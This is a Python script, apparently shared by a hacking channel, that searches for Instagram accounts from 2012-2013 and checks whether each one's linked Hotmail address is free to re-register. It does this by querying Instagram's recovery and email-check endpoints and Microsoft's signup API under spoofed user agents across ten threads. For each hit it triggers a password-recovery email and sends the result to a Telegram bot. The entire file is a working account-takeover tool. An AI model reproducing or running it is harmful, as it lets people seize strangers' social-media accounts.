import requests, re, random, os, sys, cfonts
from rich import print as g
from rich.panel import Panel
from threading import Thread
from datetime import datetime

nnn = "" 
good_hot, bad_hot, good_ig, bad_ig, check, mj, ids = 0, 0, 0, 0, 0, 0, []

K = '\033[1;31m' 
Y = '\033[1;32m' 
S = '\033[1;33m' 
M = '\033[1;36m' 
E='\x1b[1;32m'
color = "\033[91m"
reset = "\033[0m" 


Lyrox_Logo = cfonts.render('{ INSTA  TOOL}', colors=['white', 'blue'], align='center')
print(f'''\n
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓   
     
                      {Lyrox_Logo}
      ~ Programmer : @LyroxPy | Channel: @LyroxHacks ~
 
   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛    
''')

tok = input(f' {M}({M}1{M}) {M}  𝐓𝐨𝐤𝐞𝐧 𝐆𝐢𝐫𝐢𝐧𝐢𝐳 {M}:   ' + S)
print("\x1b[1;39m—" * 60)
iD = input(f' {S}({S}2{S}) {S}  𝐈𝐃 𝐆𝐢𝐫𝐢𝐧𝐢𝐳 {S} :  ' + M)
print("\x1b[1;39m—" * 60)


os.system('clear')
if not os.path.exists("Lyrox [ 2012 - 2013 ] Hits.txt"):
    with open("Lyrox [ 2012 - 2013 ] Hits.txt", "w", encoding="utf-8") as file:
        file.write("Lyrox [ 2012 - 2013 ] Hits.txt")

def save_to_file(email, followers, following, Id, post, rest, creation_date):
    with open("Lyrox [ 2012 - 2013 ] Hits.txt", "a", encoding="utf-8") as file:
        file.write(f"""
İnstagram Hits 2012 - 2013
━━━━━━━━━━━━━━━
Email : {email}@hotmail.com
Followers : {followers}
Rest : {rest}
━━━━━━━━━━━━━━━
Developer : @LyroxPy
""")

def cookie(email):
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
    try:
        url = 'https://signup.live.com'
        headers = {'user-agent': user_agent}
        response = requests.post(url, headers=headers)
        amsc = response.cookies.get_dict()['amsc']
        match = re.search(r'"apiCanary":"(.*?)"', response.text)
        if match:
            api_canary = match.group(1)
            canary = api_canary.encode().decode('unicode_escape')
        else:
            pass
        return amsc, canary
    except:
        check_hot(email)

def insta1(email):
    global good_ig, bad_ig
    try:
        app = ''.join(random.choice('1234567890') for i in range(15))
        response = requests.get('https://www.instagram.com/api/graphql')
        csrf = response.cookies.get_dict().get('csrftoken')
        rnd = str(random.randint(150, 999))
        user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111, 999)) + ")"
        common_data = {'flow': 'fxcal', 'recaptcha_challenge_field': '', }
        data = {'email_or_username': email + "@hotmail.com", **common_data}
        headers = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'accept-language': 'ar-AE, ar;q=0.9, en-US;q=0.8, en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': user_agent,
            'viewport-width': '384',
            'x-asbd-id': '129477',
            'x-csrftoken': f'{csrf}',
            'x-ig-app-id': app,
            'x-ig-www-claim': '0',
            'x-instagram-ajax': '1007832499',
            'x-requested-with': 'XMLHttpRequest'
        }
        response = requests.post('https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/', headers=headers, data=data)
        if 'email_or_sms_sen' in response.text:
            good_ig += 1
            check_hot(email)
        else:
            bad_ig += 1
    except requests.exceptions.ConnectionError:
        insta1(email)

def insta2(email):
    bb = 0
    global good_ig, bad_ig
    try:
        rnd = str(random.randint(150, 999))
        user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111, 999)) + ")"
        url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
        head = {
            'Host': 'www.instagram.com',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/signup/email/',
            'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
            'user-agent': user_agent
        }
        data = {
            'email': email + "@hotmail.com"
        }
        res = requests.post(url, headers=head, data=data)
        if 'email_is_taken' in res.text:
            good_ig += 1
            check_hot(email)
        else:
            bad_ig += 1
    except requests.exceptions.ConnectionError:
        insta2(email)

def check_hot(email):
    global good_hot, bad_hot
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
    try:
        amsc, canary = cookie(email)
        headers = {
            'authority': 'signup.live.com',
            'accept': 'application/json',
            'accept-language': 'en-US, en;q=0.9',
            'canary': canary,
            'user-agent': user_agent,
        }
        cookies = {
            'amsc': amsc
        }
        data = {
            'signInName': email + "@hotmail.com",
        }
        response = requests.post(
            'https://signup.live.com/API/CheckAvailableSigninNames', cookies=cookies, headers=headers, json=data)
        if 'isAvailable' in response.text:
            good_hot += 1
            hunting(email)
        else:
            pass
    except requests.exceptions.ConnectionError:
        check_hot(email)

def hunting(email):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
            'Accept-Language': 'en-GB, en-US',
            'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356',
        }
        data = {
            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"' + email + '"}',
            'ig_sig_key_version': '4',
        }
        try:
            response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data, )
            rest = response.json()['email']
        except:
            rest = False
        try:
            info = requests.get('https://anonyig.com/api/ig/userInfoByUsername/' + email).json()
        except:
            info = None
        try:
            Id = info['result']['user']['pk_id']
        except:
            Id = None
        try:
            followers = info['result']['user']['follower_count']
        except:
            followers = None
        try:
            following = info['result']['user']['following_count']
        except:
            following = None
        try:
            post = info['result']['user']['media_count']
        except:
            post = None
        try:
            creation_date = datetime.fromtimestamp(info['result']['user']['created_at']).strftime('%Y-%m-%d %H:%M:%S')
        except:
            creation_date = "h"
        hunt = (f"""
İnstagram Hits 2012 - 2013
━━━━━━━━━━━━━━━
Email : {email}@hotmail.com
Followers : {followers}
Rest : {rest}
━━━━━━━━━━━━━━━
Developer : @LyroxPy
""")
      
        url = f"https://api.telegram.org/bot{tok}/sendMessage"
        params = {
            "chat_id": iD,
            "text": hunt
        }
        response = requests.get(url, params=params)
        if response.status_code == 200:
            print(f"h {email}")
        else:
            print(f"h {email}")
       
        save_to_file(email, followers, following, Id, post, rest, creation_date)
        print(f"h {email}")
        print(nnn)
        hunt2 = (f"""
İnstagram Hits 2012 - 2013
━━━━━━━━━━━━━━━
Email : {email}@hotmail.com
Followers : {followers}
Rest : {rest}
━━━━━━━━━━━━━━━
Developer : @LyroxPy
""")
        Hit = Panel(hunt2)
        g(Panel(Hit, title=f"Instagram | {good_hot}"))
    except Exception as e:
        print(f"h {e}")
        hunting(email)

def check_email(email):
    global good_hot, bad_hot, bad_ig, good_ig, check
    Choice = random.choice(['insta1', 'insta2'])
    if Choice != 'insta2':
        insta1(email)
    else:
        insta2(email)
    b = random.randint(5, 208)
    bo = f'\x1b[38;5;{b}m'
    check += 1
    print(55*'━')
    sys.stdout.write(f"\r\n"
                 f"{color}✅ Hits : {good_hot}\n"
                 f"❌ Bad : {bad_ig}\n"
                 f"🟡 Good IG : {good_ig}\n"
                 f"🦎 Developer : @LyroxPy\n\n")
    sys.stdout.flush()
    print(55*'━')
    os.system('clear')

def lyrox():
    Id = str(random.randrange(128053904, 438909537))
    if Id not in ids:
        ids.append(Id)
        return Id
    else:
        lyrox()

def LyroxPy():
    global check
    try:
        while True:
            rnd = str(random.randint(150, 999))
            user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111, 999)) + ")"
            Id = lyrox()
            lsd = ''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(32))
            headers = {
                'accept': '*/*',
                'accept-language': 'en,en-US;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'dnt': '1',
                'origin': 'https://www.instagram.com',
                'priority': 'u=1, i',
                'referer': 'https://www.instagram.com/cristiano/following/',
                'user-agent': user_agent,
                'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                'x-fb-lsd': lsd,
            }
            data = {
                'lsd': lsd,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                'variables': '{"userID":"' + str(Id) + '","username":"cristiano"}',
                'server_timestamps': 'true',
                'doc_id': '7717269488336001',
            }
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            user = response.json()['data']['user']['username']
            check_email(user)
    except:
        LyroxPy()

for i in range(10):
    Thread(target=LyroxPy).start()
    # ~ @LyroxPy
             
             # ~ @LyroxPy